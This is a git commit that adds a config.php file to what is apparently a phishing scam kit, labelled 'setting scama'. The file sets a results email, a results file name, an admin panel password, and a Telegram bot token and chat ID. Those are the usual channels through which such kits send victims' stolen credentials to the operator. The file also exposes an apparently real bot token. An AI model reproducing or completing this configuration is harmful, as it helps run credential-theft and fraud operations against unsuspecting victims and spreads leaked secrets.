35bb16a3b6c18294c308444d9c7d69a143a7aff0
ifsoun <111191348+ifsoun@users.noreply.github.com>
2022-08-13 17:26:34 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php
+// setting scama
+$yourmail  = "";  // your email 
+$namerand = "rzlt";  // name for file rzult *
+$pass = "123345"; // pass admin panel
+$botToken="5222298848:AAH7J1VTdJJhbvnmy28kj5cvugLLBmvSQIw"; // token bot telegram
+$chatId="-739939094";  // chatId telegram
+
+?>
